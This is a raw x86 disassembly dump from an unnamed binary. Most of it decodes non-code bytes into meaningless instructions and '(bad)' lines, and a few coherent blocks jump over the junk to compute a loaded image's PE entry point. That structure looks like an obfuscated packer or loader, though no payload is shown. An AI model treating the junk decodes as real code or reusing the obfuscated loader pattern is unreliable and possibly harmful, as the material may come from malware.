  41d5f8:	rcr    BYTE PTR [ecx],0x9c
  41d5fb:	cmc    
  41d5fc:	xor    al,0x7
  41d5fe:	jg     0x41d5ee
  41d600:	ss push 0x77fbcb5c
  41d606:	dec    eax
  41d607:	aaa    
  41d608:	mov    ch,0x66
  41d60a:	mov    ch,0x46
  41d60c:	push   edi
  41d60d:	iret   
  41d60e:	and    BYTE PTR [ebx],dh
  41d610:	call   0x664c:0xf6601ac7
  41d617:	addr16 pop edi
  41d619:	dec    ecx
  41d61b:	sbb    al,0x3a
  41d61d:	jp     0x41d5ef
  41d61f:	push   ss
  41d620:	retf   0xef79
  41d623:	jo     0x41d614
  41d625:	(bad)
  41d629:	push   es
  41d62a:	out    0xa3,eax
  41d62c:	fs xchg esp,eax
  41d62e:	rcl    BYTE PTR [edi-0x52274bfd],cl
  41d634:	xchg   esi,eax
  41d635:	push   0x2a40154b
  41d63a:	dec    esp
  41d63b:	out    dx,al
  41d63c:	xchg   esi,eax
  41d63d:	push   ds
  41d63e:	aad    0xdb
  41d640:	ror    BYTE PTR [ecx+0x322a839c],0x79
  41d647:	(bad)  
  41d648:	in     al,0xe
  41d64a:	fs push ebx
  41d64c:	and    ecx,DWORD PTR [ebx]
  41d64e:	test   eax,0x77a0ea17
  41d653:	clc    
  41d654:	ins    BYTE PTR es:[edi],dx
  41d655:	sub    BYTE PTR [edi+0x3184b93c],ah
  41d65b:	pop    es
  41d65c:	mov    esi,0xd90d3731
  41d661:	sub    eax,0xf80eb7af
  41d666:	mov    ch,0xd8
  41d668:	push   eax
  41d669:	adc    BYTE PTR [esp+0x6d],dh
  41d66d:	int3   
  41d66e:	adc    edx,DWORD PTR [ebx+0x5]
  41d671:	stos   DWORD PTR es:[edi],eax
  41d672:	hlt    
  41d673:	in     eax,0xf1
  41d675:	in     al,0x86
  41d677:	clc    
  41d678:	push   es
  41d679:	test   eax,0x7a1537d8
  41d67e:	enter  0x1adc,0xec
  41d682:	cld    
  41d683:	mov    eax,0xde63bc0b
  41d688:	mov    WORD PTR [eax],gs
  41d68a:	and    al,0x3f
  41d68c:	fisub  WORD PTR [esi+0x55]
  41d68f:	jb     0x41d6aa
  41d691:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d692:	retf   
  41d693:	scas   eax,DWORD PTR es:[edi]
  41d694:	sbb    bl,BYTE PTR [edx+ecx*4-0x2f0baaa4]
  41d69b:	enter  0xfdd8,0x86
  41d69f:	xor    DWORD PTR [ebx+0x2f],0xbe835e9b
  41d6a6:	ret    
  41d6a7:	jns    0x41d65d
  41d6a9:	aam    0xaf
  41d6ab:	repz loope 0x41d65d
  41d6ae:	pop    ebx
  41d6af:	pop    ebp
  41d6b0:	lahf   
  41d6b1:	loop   0x41d6e8
  41d6b3:	retf   
  41d6b4:	inc    ecx
  41d6b5:	in     al,dx
  41d6b6:	dec    ecx
  41d6b7:	jne    0x41d6c8
  41d6b9:	xchg   ebp,eax
  41d6ba:	adc    WORD PTR [edx-0x79642ec8],bp
  41d6c1:	sbb    ah,BYTE PTR [eax+0x78]
  41d6c4:	enter  0x318a,0xf8
  41d6c8:	xor    al,0x64
  41d6ca:	mov    ah,0x8f
  41d6cc:	add    BYTE PTR [ebx+0x7c],0xfd
  41d6d0:	and    al,0x2
  41d6d2:	jae    0x41d730
  41d6d4:	jge    0x41d687
  41d6d6:	mov    ebp,0xb687f1d2
  41d6db:	popa   
  41d6dc:	fwait
  41d6dd:	cmp    ebx,0x3a
  41d6e0:	xor    BYTE PTR [esi+eax*8-0x2f],0x28
  41d6e5:	test   BYTE PTR [esi-0x6f],ah
  41d6e8:	inc    esp
  41d6e9:	arpl   di,bx
  41d6eb:	call   0xcbed84c6
  41d6f0:	cmp    BYTE PTR ds:0xdbb5277b,0xdc
  41d6f7:	int3   
  41d6f8:	sub    eax,0xc43c4667
  41d6fd:	lods   al,BYTE PTR ds:[esi]
  41d6fe:	call   FWORD PTR [eax]
  41d700:	scas   al,BYTE PTR es:[edi]
  41d701:	fisub  WORD PTR [ebp+0xe]
  41d704:	xchg   ebp,eax
  41d705:	es fsubrp st(2),st
  41d708:	mov    ds:0xcac09edd,eax
  41d70d:	nop
  41d70e:	int3   
  41d70f:	xor    eax,0x5ddb9c68
  41d714:	and    eax,0x71628260
  41d719:	mov    edx,0x20bd4cb3
  41d71e:	sub    DWORD PTR [edi+eiz*8-0x1f],esp
  41d722:	stc    
  41d723:	dec    eax
  41d724:	jb     0x41d786
  41d726:	xlat   BYTE PTR ds:[ebx]
  41d727:	or     DWORD PTR [edi-0x34],ebx
  41d72a:	aad    0xaa
  41d72c:	xchg   edi,eax
  41d72d:	inc    ecx
  41d72e:	shl    ecx,1
  41d730:	(bad)  
  41d731:	clc    
  41d732:	mov    ss,WORD PTR [ebx-0x4febed01]
  41d738:	xchg   ebp,eax
  41d739:	fs mov ch,0xd3
  41d73c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d73d:	mov    DWORD PTR [ecx],ecx
  41d73f:	mov    edx,0xf4705696
  41d744:	inc    edi
  41d745:	lds    eax,FWORD PTR [ebx-0x44]
  41d748:	data16 and BYTE PTR [ecx+0x0],dh
  41d74c:	loope  0x41d75c
  41d74e:	cmc    
  41d74f:	sub    edx,DWORD PTR [ecx+0x25]
  41d752:	xor    eax,0xb7ae3398
  41d757:	nop    DWORD PTR [ebp-0x35]
  41d75b:	mov    ecx,0x2e5d3208
  41d760:	jge    0x41d7b6
  41d762:	stc    
  41d763:	pusha  
  41d764:	mov    ch,BYTE PTR [edx]
  41d766:	push   ebx
  41d767:	popf   
  41d768:	repz in al,dx
  41d76a:	cmp    eax,0xcf0227d6
  41d76f:	pop    edi
  41d770:	es cdq 
  41d772:	mov    cl,0xed
  41d774:	popa   
  41d775:	mov    bl,0xad
  41d777:	in     al,dx
  41d778:	sub    esp,DWORD PTR [esp+ecx*1]
  41d77b:	jmp    0x3cd2:0xadd3607c
  41d782:	scas   eax,DWORD PTR es:[edi]
  41d783:	rcl    DWORD PTR [edi+0x55f3bd6d],cl
  41d789:	loop   0x41d7fe
  41d78b:	mov    ch,0x56
  41d78d:	pop    esi
  41d78e:	mov    edx,0xaef2567
  41d793:	lock xor BYTE PTR [ecx+0x7d],al
  41d797:	xor    BYTE PTR [edi+0x639a2dbb],ch
  41d79d:	lods   eax,DWORD PTR ds:[esi]
  41d79e:	dec    ecx
  41d79f:	enter  0x4177,0x21
  41d7a3:	sahf   
  41d7a4:	(bad)  
  41d7a6:	ins    DWORD PTR es:[edi],dx
  41d7a7:	dec    edx
  41d7a8:	lea    ecx,[ebp+0x6c26cc55]
  41d7ae:	lods   al,BYTE PTR ds:[esi]
  41d7b0:	gs xor eax,0x3a23814f
  41d7b6:	inc    ecx
  41d7b7:	mov    ah,0x79
  41d7b9:	daa    
  41d7ba:	jb     0x41d7c4
  41d7bc:	shr    al,1
  41d7be:	adc    al,0xb5
  41d7c0:	test   BYTE PTR [edx],dl
  41d7c2:	iret   
  41d7c3:	js     0x41d79a
  41d7c5:	jne    0x41d82b
  41d7c7:	dec    eax
  41d7c8:	lea    ecx,[ebp+0x4c149ed2]
  41d7ce:	sbb    esp,eax
  41d7d0:	outs   dx,DWORD PTR ds:[esi]
  41d7d1:	(bad)  
  41d7d2:	aaa    
  41d7d3:	add    dh,cl
  41d7d5:	cdq    
  41d7d6:	gs mov cl,0xf8
  41d7d9:	call   0x41f0a3e4
  41d7de:	adc    esi,DWORD PTR [ecx+0x67]
  41d7e1:	xor    cl,BYTE PTR [edi]
  41d7e3:	lock pop esi
  41d7e5:	retf   
  41d7e6:	inc    esp
  41d7e7:	sahf   
  41d7e8:	jle    0x41d807
  41d7ea:	out    dx,al
  41d7eb:	push   esi
  41d7ec:	pop    ecx
  41d7ed:	sbb    bl,dh
  41d7ef:	push   cs
  41d7f0:	fsubr  QWORD PTR [esi]
  41d7f2:	(bad)  
  41d7f3:	mov    ecx,0xd54f3df0
  41d7f8:	mov    cl,0xfb
  41d7fa:	stos   DWORD PTR es:[edi],eax
  41d7fb:	(bad)  
  41d7fd:	iret   
  41d7fe:	mov    al,dh
  41d800:	imul   ebx,DWORD PTR [ecx+0x1e],0x5fd9600b
  41d807:	or     ah,ah
  41d809:	ins    DWORD PTR es:[edi],dx
  41d80a:	sub    al,0x6b
  41d80c:	loop   0x41d887
  41d80e:	and    ebp,DWORD PTR [ebx+0x7290ea0a]
  41d814:	outs   dx,DWORD PTR ds:[esi]
  41d815:	lds    ecx,FWORD PTR [ebx-0x65]
  41d818:	sti    
  41d819:	addr16 retf 
  41d81b:	mov    eax,ds:0x7d177e21
  41d820:	lea    eax,[eax+edi*1+0x5b]
  41d824:	mov    ah,0x10
  41d826:	imul   edi,DWORD PTR [ecx],0xfed71c11
  41d82c:	and    eax,0xab57aa1a
  41d831:	aam    0x63
  41d833:	adc    eax,DWORD PTR [esi+ebp*1-0x27]
  41d837:	xchg   DWORD PTR [eax+0x2b08a4a8],ecx
  41d83d:	or     eax,0x91a33e6b
  41d842:	mov    edi,0x3517e1b3
  41d847:	mov    ecx,0x21dc59c4
  41d84c:	(bad)
  41d850:	retf   0xe3d5
  41d853:	and    ch,BYTE PTR [ecx]
  41d855:	or     ecx,DWORD PTR [edx-0x7a]
  41d858:	pop    ecx
  41d859:	push   ds
  41d85a:	loopne 0x41d85e
  41d85c:	mov    ebx,0xa9a0589b
  41d861:	adc    DWORD PTR [esi+0xb4047fd],0x4eb2de55
  41d86b:	pop    edx
  41d86c:	push   esi
  41d86d:	sbb    DWORD PTR [ebp-0x5],eax
  41d870:	jmp    0x8c89:0xfaa43a7
  41d877:	mov    edx,0x4a56b689
  41d87c:	push   es
  41d87d:	mov    ah,BYTE PTR [esi+0x2c16768d]
  41d883:	popa   
  41d884:	dec    edx
  41d885:	jg     0x41d818
  41d887:	adc    ecx,ecx
  41d889:	xchg   ebp,eax
  41d88a:	scas   eax,DWORD PTR es:[edi]
  41d88b:	sbb    esp,DWORD PTR [ebp-0x3e]
  41d88e:	iret   
  41d88f:	add    DWORD PTR [ebp+0x203f940d],ecx
  41d895:	sbb    al,0x80
  41d897:	pop    dx
  41d899:	shl    DWORD PTR ds:0xaaab2eb,cl
  41d89f:	jecxz  0x41d877
  41d8a1:	xchg   esi,eax
  41d8a2:	jmp    FWORD PTR ds:0x558a905e
  41d8a8:	call   0x86b6351e
  41d8ad:	fwait
  41d8ae:	inc    ecx
  41d8af:	and    edi,DWORD PTR [esi+0x1b5810f2]
  41d8b5:	loope  0x41d912
  41d8b7:	adc    DWORD PTR [edx],eax
  41d8b9:	jmp    0x4602:0xaa94e0ca
  41d8c0:	push   edi
  41d8c1:	mov    dh,0x8b
  41d8c3:	(bad)  
  41d8c4:	inc    eax
  41d8c5:	jns    0x41d93c
  41d8c7:	pop    edi
  41d8c8:	repz jle 0x41d879
  41d8cb:	and    DWORD PTR ds:0x7d024b55,esp
  41d8d1:	sub    bl,BYTE PTR [eax]
  41d8d3:	xor    DWORD PTR [ecx+0x20891181],esp
  41d8d9:	pop    edi
  41d8da:	fdivr  DWORD PTR [edx+0x1f]
  41d8dd:	push   ebx
  41d8de:	test   al,0x5d
  41d8e0:	ins    DWORD PTR es:[edi],dx
  41d8e1:	or     BYTE PTR ds:0x50e2829a,ch
  41d8e7:	pop    ds
  41d8e8:	or     ebx,DWORD PTR [edi+0x2e]
  41d8eb:	call   0xfba20286
  41d8f0:	(bad)  [esi+0x3b097900]
  41d8f6:	js     0x41d884
  41d8f8:	ja     0x41d88e
  41d8fa:	sub    DWORD PTR [edx-0x1cc9d736],ebx
  41d900:	ja     0x41d963
  41d902:	sbb    edi,DWORD PTR [ebp+0x62]
  41d905:	mov    ?,WORD PTR [ebp+ebx*1-0x75]
  41d909:	push   esp
  41d90a:	and    al,0x18
  41d90c:	mov    edi,DWORD PTR [esp+0x1c]
  41d910:	add    eax,edx
  41d912:	adc    ecx,edi
  41d914:	mov    DWORD PTR [esp+0x18],eax
  41d918:	mov    DWORD PTR [esp+0x1c],ecx
  41d91c:	jmp    0x41d926
  41d921:	mov    ebx,0xca79a575
  41d926:	push   0x4
  41d928:	push   0x422518
  41d92d:	jmp    0x41dcfc
  41d932:	mov    cl,0x3a
  41d934:	cdq    
  41d935:	lahf   
  41d936:	bound  ebx,QWORD PTR [edx-0x24cc5e1]
  41d93c:	mov    ds:0xdf4faebc,eax
  41d941:	jle    0x41d9c2
  41d943:	dec    ebp
  41d944:	push   ss
  41d945:	sbb    BYTE PTR [edx+edx*1+0x8271818],bh
  41d94c:	xor    edi,ecx
  41d94e:	lar    edi,WORD PTR [esi]
  41d951:	pusha  
  41d952:	inc    ecx
  41d953:	xchg   BYTE PTR [ebx-0x26],bh
  41d956:	cli    
  41d957:	ins    DWORD PTR es:[edi],dx
  41d958:	push   edi
  41d959:	ja     0x41d928
  41d95b:	pusha  
  41d95c:	and    eax,0x9ea1a20d
  41d961:	dec    ecx
  41d962:	or     BYTE PTR [edi+0x79],dl
  41d965:	jns    0x41d93b
  41d967:	cli    
  41d968:	arpl   WORD PTR [eax+0x48],sp
  41d96b:	mov    bl,0xb4
  41d96d:	(bad)  
  41d96e:	jne    0x41d914
  41d970:	popa   
  41d971:	scas   eax,DWORD PTR es:[edi]
  41d972:	mov    ds:0xa1ba4be1,al
  41d977:	out    dx,eax
  41d978:	out    dx,al
  41d979:	jmp    0xc995:0x92266114
  41d980:	sbb    DWORD PTR [ecx-0x7b],edi
  41d983:	sbb    edx,DWORD PTR [ebx]
  41d985:	pop    eax
  41d986:	pop    ecx
  41d987:	or     eax,0xe14140cf
  41d98c:	outs   dx,BYTE PTR ds:[esi]
  41d98d:	or     ah,BYTE PTR [ecx-0x250f78bc]
  41d993:	stc    
  41d994:	cmp    al,0x5c
  41d996:	data16 sub BYTE PTR [edi+0x30],ch
  41d99a:	push   ebp
  41d99b:	(bad)  
  41d99c:	not    DWORD PTR [ecx-0x27]
  41d99f:	rcr    DWORD PTR [edi+0x523012b1],1
  41d9a5:	(bad)  
  41d9a6:	fisttp WORD PTR [ecx-0x7b]
  41d9a9:	test   DWORD PTR [esi+0x45],esp
  41d9ac:	adc    BYTE PTR [ecx],al
  41d9ae:	test   esp,esp
  41d9b0:	and    eax,0xf7701ffa
  41d9b5:	jmp    0x41d957
  41d9b7:	mov    ?,WORD PTR [eax+0x60]
  41d9ba:	shl    edi,1
  41d9bc:	popa   
  41d9bd:	push   ebx
  41d9be:	hlt    
  41d9bf:	ja     0x41d9c5
  41d9c1:	xor    edx,0xfd293eb8
  41d9c7:	sbb    al,0xec
  41d9c9:	sub    edx,DWORD PTR [esi]
  41d9cb:	jg     0x41da49
  41d9cd:	(bad)  
  41d9cf:	add    dh,BYTE PTR [ebx+eax*2]
  41d9d2:	push   0xe78d4258
  41d9d7:	cmp    BYTE PTR [ecx+ebp*4-0x58],ch
  41d9db:	and    al,0x2c
  41d9dd:	sub    BYTE PTR [ecx+eax*2+0x51],ch
  41d9e1:	jo     0x41da1f
  41d9e3:	shl    BYTE PTR [edx-0x67],1
  41d9e6:	fdiv   QWORD PTR [edi]
  41d9e8:	inc    ebp
  41d9e9:	dec    ecx
  41d9ea:	push   esi
  41d9eb:	pusha  
  41d9ec:	fwait
  41d9ed:	or     dl,dh
  41d9ef:	ror    DWORD PTR [edi-0x343a360d],0x9e
  41d9f6:	push   ss
  41d9f7:	outs   dx,DWORD PTR ds:[esi]
  41d9f8:	mov    ah,0x3b
  41d9fa:	call   edx
  41d9fc:	jo     0x41d9e3
  41d9fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d9ff:	ja     0x41da71
  41da01:	fs (bad) 
  41da03:	imul   ebx,ebp,0x6
  41da06:	push   ebp
  41da07:	jne    0x41d9d9
  41da09:	aaa    
  41da0a:	mov    edi,0xacf7ca1d
  41da0f:	lahf   
  41da10:	dec    eax
  41da11:	sub    eax,0x800c7f04
  41da16:	scas   eax,DWORD PTR es:[edi]
  41da17:	lods   al,BYTE PTR ds:[esi]
  41da18:	mov    ch,0x85
  41da1a:	jo     0x41d9f3
  41da1c:	shr    DWORD PTR [esi+ecx*8+0x4b001752],0xa8
  41da24:	call   0xd80355c3
  41da29:	cmp    BYTE PTR [ebx-0x41],bl
  41da2c:	lock sbb eax,0xf5194044
  41da32:	jge    0x41d9ee
  41da34:	test   eax,0xdc373c14
  41da39:	scas   al,BYTE PTR es:[edi]
  41da3a:	cs ss xchg esp,eax
  41da3d:	mov    eax,0x4219f062
  41da42:	sbb    al,0xbd
  41da44:	in     al,0x66
  41da46:	mov    ds:0xab3ac148,eax
  41da4b:	xor    BYTE PTR [eax],cl
  41da4d:	jmp    0x6bf3e4cd
  41da52:	sti    
  41da53:	mov    DWORD PTR [ebp-0xd24af93],edi
  41da59:	mov    dh,0x30
  41da5b:	sub    BYTE PTR [ebx+0x44],dl
  41da5e:	mov    ah,0x49
  41da60:	(bad)  
  41da61:	mov    ebp,0x4e8fa7cc
  41da66:	and    al,BYTE PTR [edx+0x735018c5]
  41da6c:	(bad)
  41da6f:	pop    es
  41da70:	out    0x11,al
  41da72:	pop    ecx
  41da73:	jle    0x41daa7
  41da75:	mov    ah,0xd
  41da77:	cmp    bl,bl
  41da79:	or     al,0xdf
  41da7b:	das    
  41da7c:	and    al,0xcd
  41da7e:	push   0xffffffc1
  41da80:	dec    ebx
  41da81:	cs push esi
  41da83:	cmp    BYTE PTR [ecx+0x77],0xca
  41da87:	loope  0x41dab3
  41da89:	idiv   dl
  41da8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da8c:	std    
  41da8d:	xchg   ebx,eax
  41da8e:	dec    edx
  41da8f:	imul   eax,DWORD PTR [edx+ebx*1],0xffffff8d
  41da93:	sub    edi,DWORD PTR [ebx]
  41da95:	mov    ecx,0x85ebe732
  41da9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da9b:	sbb    DWORD PTR [eax+0x7dbea341],0xfffffff9
  41daa2:	out    0x46,al
  41daa4:	mov    eax,0x669d9791
  41daa9:	aad    0xa1
  41daab:	xchg   ebp,eax
  41daac:	mov    al,0x76
  41daae:	mov    bh,0x7e
  41dab0:	sbb    eax,0x7efd78dd
  41dab5:	push   0x3432ba37
  41daba:	arpl   ax,cx
  41dabc:	fsub   QWORD PTR [ebp-0x2bb9b7ee]
  41dac2:	daa    
  41dac3:	mov    ch,0x4d
  41dac5:	rcr    DWORD PTR [ebx-0x7652395a],0x6e
  41dacc:	push   cs
  41dacd:	mov    esi,DWORD PTR [ecx]
  41dacf:	lea    ebx,[ebx]
  41dad1:	out    dx,al
  41dad2:	mov    cl,0xb8
  41dad4:	bound  esi,QWORD PTR [edi]
  41dad6:	sbb    DWORD PTR [ecx+0x5c02b5a],0x3143a4a9
  41dae0:	jo     0x41db06
  41dae2:	push   edi
  41dae3:	add    eax,0xfe91f122
  41dae8:	arpl   WORD PTR [eax+0x28],di
  41daeb:	adc    dl,BYTE PTR [ebx]
  41daed:	cld    
  41daee:	fdiv   DWORD PTR [edx+eiz*1-0x5d28d0f6]
  41daf5:	xchg   ebx,eax
  41daf6:	loopne 0x41dafc
  41daf8:	mov    cl,0x75
  41dafa:	int    0x8f
  41dafc:	or     ecx,DWORD PTR [eax+ebx*1-0x63]
  41db00:	add    ebp,DWORD PTR [ebp+0x6d]
  41db03:	xchg   edi,eax
  41db04:	pop    edi
  41db05:	mov    eax,ds:0x9329142b
  41db0a:	xlat   BYTE PTR ds:[ebx]
  41db0b:	pop    eax
  41db0c:	cmp    al,0x38
  41db0e:	data16 xlat BYTE PTR gs:[ebx]
  41db11:	sbb    al,0xd7
  41db13:	stos   BYTE PTR es:[edi],al
  41db14:	cmp    ebx,DWORD PTR [ebp+ecx*1+0x36]
  41db18:	mov    edi,0x83312e18
  41db1d:	push   esp
  41db1e:	inc    ebx
  41db1f:	stos   BYTE PTR es:[edi],al
  41db20:	sub    DWORD PTR ds:0xe238bd79,ebp
  41db26:	inc    edx
  41db27:	pop    ecx
  41db28:	inc    ecx
  41db29:	jo     0x41daf7
  41db2b:	adc    ch,BYTE PTR [eax+0x5c]
  41db2e:	jbe    0x41dab8
  41db30:	inc    ebx
  41db31:	inc    esp
  41db32:	arpl   si,si
  41db34:	sub    eax,0x8af191d1
  41db39:	dec    ecx
  41db3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db3b:	aad    0xa3
  41db3d:	shld   DWORD PTR [edi+0x6],esi,0x12
  41db42:	ins    BYTE PTR es:[edi],dx
  41db43:	retf   0xef4b
  41db46:	rol    BYTE PTR [ecx-0x945d842],1
  41db4c:	sbb    al,0xef
  41db4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db4f:	stos   BYTE PTR es:[edi],al
  41db50:	es mov dh,0xdb
  41db53:	adc    bh,BYTE PTR [edi+ebp*4+0x6a]
  41db57:	(bad)  
  41db59:	test   eax,0xdaa010ed
  41db5e:	mov    WORD PTR [edx-0x65],?
  41db61:	pushf  
  41db62:	inc    ebx
  41db63:	pop    ds
  41db64:	arpl   WORD PTR cs:[ebx+ebp*8+0x1c6000f5],bp
  41db6c:	fst    QWORD PTR [ecx-0x67]
  41db6f:	jecxz  0x41db6f
  41db71:	mov    ebx,0xb4ce8d2b
  41db76:	es or  BYTE PTR es:[ebx],ah
  41db7a:	cdq    
  41db7b:	sub    BYTE PTR [esi+ebx*1+0x0],0xb8
  41db80:	xor    DWORD PTR [edi],ebp
  41db82:	push   0xefea7025
  41db87:	mov    esi,0xf4ec131f
  41db8c:	icebp  
  41db8d:	adc    al,0xf2
  41db8f:	cld    
  41db90:	push   0xffffffb7
  41db92:	xchg   ecx,eax
  41db93:	ja     0x41db84
  41db95:	jl     0x41db87
  41db97:	jo     0x41db1e
  41db99:	sbb    eax,0x9fbc7918
  41db9e:	pop    dx
  41dba0:	mov    dh,0x79
  41dba2:	ret    0xf68e
  41dba5:	adc    bl,ah
  41dba7:	popf   
  41dba8:	popf   
  41dba9:	loopne 0x41dbd1
  41dbab:	dec    BYTE PTR [ebx-0x2c]
  41dbae:	sub    DWORD PTR [ebx],0xffffffe3
  41dbb1:	outs   dx,DWORD PTR ds:[esi]
  41dbb2:	ss jmp 0xfaadc8dc
  41dbb8:	jno    0x41dc03
  41dbba:	das    
  41dbbb:	outs   dx,DWORD PTR ds:[esi]
  41dbbc:	ins    DWORD PTR es:[edi],dx
  41dbbd:	jmp    0x1189fc15
  41dbc2:	pusha  
  41dbc3:	mov    bl,0xe1
  41dbc5:	repz cmp BYTE PTR [edi+edx*4-0xab9b151],al
  41dbcd:	leave  
  41dbce:	repz push cs
  41dbd0:	jnp    0x41dbcc
  41dbd2:	mov    edi,edx
  41dbd4:	cvtps2pi mm6,QWORD PTR [ebx]
  41dbd7:	(bad)  
  41dbd8:	pop    ds
  41dbd9:	retf   0xed7a
  41dbdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dbdd:	pop    ecx
  41dbde:	sub    edx,DWORD PTR [eax]
  41dbe0:	push   eax
  41dbe1:	and    ebx,eax
  41dbe3:	and    eax,0xd9ac5751
  41dbe8:	adc    al,0xff
  41dbea:	je     0x41dc2f
  41dbec:	sub    ecx,ebp
  41dbee:	(bad)  
  41dbf0:	clc    
  41dbf1:	rol    esp,1
  41dbf3:	cdq    
  41dbf4:	sub    DWORD PTR [esi],ebp
  41dbf6:	and    eax,0x7128a6d7
  41dbfb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dbfc:	lahf   
  41dbfd:	out    0x3a,eax
  41dbff:	dec    edi
  41dc00:	cwde   
  41dc01:	stos   DWORD PTR es:[edi],eax
  41dc02:	mov    bl,0x5f
  41dc04:	fldcw  WORD PTR [eax]
  41dc06:	pop    edi
  41dc07:	inc    edx
  41dc08:	inc    esi
  41dc09:	int    0x58
  41dc0b:	and    eax,0x86b3dc49
  41dc10:	mov    WORD PTR [edx+0x5237dbb6],es
  41dc16:	sub    al,0x8a
  41dc18:	inc    eax
  41dc19:	or     eax,DWORD PTR [esi-0x32]
  41dc1c:	fs sub al,0xc3
  41dc1f:	fnstsw WORD PTR [esi-0x60]
  41dc22:	mov    edi,edi
  41dc24:	jg     0x41dbb0
  41dc26:	add    BYTE PTR [edi-0x42],cl
  41dc29:	pop    ds
  41dc2a:	xchg   edx,eax
  41dc2b:	aas    
  41dc2c:	sub    eax,0x25b6bd84
  41dc31:	sbb    dh,BYTE PTR [esi+0x5b]
  41dc34:	adc    ebx,DWORD PTR [esi+ebp*4]
  41dc37:	push   esi
  41dc38:	mov    eax,DWORD PTR [ebx-0x26a26600]
  41dc3e:	fs inc edx
  41dc40:	add    ecx,ebx
  41dc42:	out    0x88,eax
  41dc44:	iret   
  41dc45:	mov    eax,ds:0x65f77504
  41dc4a:	aas    
  41dc4b:	mov    cl,ah
  41dc4d:	mov    BYTE PTR [edi-0x46cf3f21],dl
  41dc53:	cmp    al,0x26
  41dc55:	adc    BYTE PTR [edx],ch
  41dc57:	mov    eax,ds:0xf23b3136
  41dc5c:	adc    DWORD PTR [esi],0x8f31043a
  41dc62:	sbb    DWORD PTR [ebp-0x15],edx
  41dc65:	mov    ebp,0xc1bf158
  41dc6a:	push   ebp
  41dc6b:	and    DWORD PTR [ebp+ebx*8+0x70d9b82e],ecx
  41dc72:	pushf  
  41dc73:	(bad)  
  41dc74:	mov    ah,0xb0
  41dc76:	inc    edi
  41dc77:	push   eax
  41dc78:	in     eax,0x80
  41dc7a:	(bad)  
  41dc7b:	gs cmp al,0xe3
  41dc7e:	lds    esi,FWORD PTR [ebx]
  41dc80:	pop    ss
  41dc81:	jnp    0x41dcdb
  41dc83:	shr    DWORD PTR [edx+eax*1+0x24458444],0xe2
  41dc8b:	mov    bh,0x94
  41dc8d:	mov    esi,0x50ce9512
  41dc92:	and    eax,0xd6724c6e
  41dc98:	and    eax,0xe7bb8c1e
  41dc9d:	aas    
  41dc9e:	retf   0x2c1e
  41dca1:	leave  
  41dca2:	fmul   DWORD PTR [edx+eax*4+0x11558beb]
  41dca9:	adc    BYTE PTR [ebx+0x66787dd7],dh
  41dcaf:	scas   eax,DWORD PTR es:[edi]
  41dcb0:	fdiv   DWORD PTR [eax-0x6c96c0ba]
  41dcb6:	hlt    
  41dcb7:	sub    bh,BYTE PTR [edi+0x46282d6a]
  41dcbd:	dec    ebx
  41dcbe:	mov    cs,edi
  41dcc0:	pusha  
  41dcc1:	mov    bh,0xd
  41dcc3:	and    eax,0x2b02dda0
  41dcc8:	sub    ecx,DWORD PTR [eax]
  41dcca:	jo     0x41dd36
  41dccc:	pop    es
  41dccd:	xchg   edi,eax
  41dcce:	sub    cl,bh
  41dcd0:	sbb    bl,BYTE PTR [ecx-0x7c809a73]
  41dcd6:	add    esp,eax
  41dcd8:	loopne 0x41dc91
  41dcda:	adc    DWORD PTR [ebp-0x47],edx
  41dcdd:	push   edi
  41dcde:	fsubr  QWORD PTR [eax]
  41dce0:	jno    0x41dd04
  41dce2:	jmp    0xe0ca:0x17509cdd
  41dce9:	test   eax,0x441ebdad
  41dcee:	and    al,0x75
  41dcf0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dcf1:	outs   dx,DWORD PTR ds:[esi]
  41dcf2:	sub    BYTE PTR [ecx+esi*8-0x5c60fc32],bh
  41dcf9:	jecxz  0x41dc89
  41dcfb:	stos   DWORD PTR es:[edi],eax
  41dcfc:	lea    eax,[esp+0x6c]
  41dd00:	push   eax
  41dd01:	call   0x415231
  41dd06:	mov    eax,DWORD PTR [esp+0x64]
  41dd0a:	push   0x4
  41dd0c:	push   DWORD PTR [eax+0x1a4]
  41dd12:	lea    eax,[esp+0x74]
  41dd16:	push   eax
  41dd17:	call   0x415231
  41dd1c:	mov    eax,DWORD PTR [esp+0x64]
  41dd20:	mov    eax,DWORD PTR [eax+0x1a4]
  41dd26:	mov    eax,DWORD PTR [eax]
  41dd28:	mov    ecx,DWORD PTR [esp+0x64]
  41dd2c:	mov    eax,DWORD PTR [eax+0x3c]
  41dd2f:	mov    ecx,DWORD PTR [ecx+0x1a4]
  41dd35:	mov    ecx,DWORD PTR [ecx]
  41dd37:	lea    eax,[ecx+eax*1+0x28]
  41dd3b:	mov    eax,DWORD PTR [eax]
  41dd3d:	add    DWORD PTR [esp+0x6c],eax
  41dd41:	mov    DWORD PTR [esp+0x30],0x127
  41dd49:	jmp    0x41e118
  41dd4e:	dec    edi
  41dd4f:	inc    eax
  41dd50:	mov    ds:0x3a6ba279,al
  41dd55:	push   ds
  41dd56:	(bad)  
  41dd57:	push   edx
  41dd59:	push   0xffffffa6
  41dd5b:	pop    ds
  41dd5c:	shl    DWORD PTR [eax+0x18164722],0xbc
  41dd63:	adc    bl,BYTE PTR [eax]
  41dd65:	sbb    BYTE PTR [ecx-0xece55b7],cl
  41dd6b:	mov    esp,0x4a5edb1d
  41dd70:	fbstp  TBYTE PTR [esi]
  41dd72:	gs (bad) 
  41dd74:	repz pop ebx
  41dd76:	fisub  DWORD PTR [ebp-0x6e35032c]
  41dd7c:	cmc    
  41dd7d:	jne    0x41dde5
  41dd7f:	pop    edi
  41dd80:	pop    es
  41dd81:	ror    ebp,0x90
  41dd84:	(bad)  
  41dd85:	loopne 0x41dd40
  41dd87:	jb     0x41dd61
  41dd89:	in     al,dx
  41dd8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd8b:	cmc    
  41dd8c:	mov    edi,0x1c850040
  41dd91:	cmp    eax,0x1401e8c7
  41dd96:	or     DWORD PTR [eax+0x52],esi
  41dd99:	cmp    edx,DWORD PTR [eax+0x66]
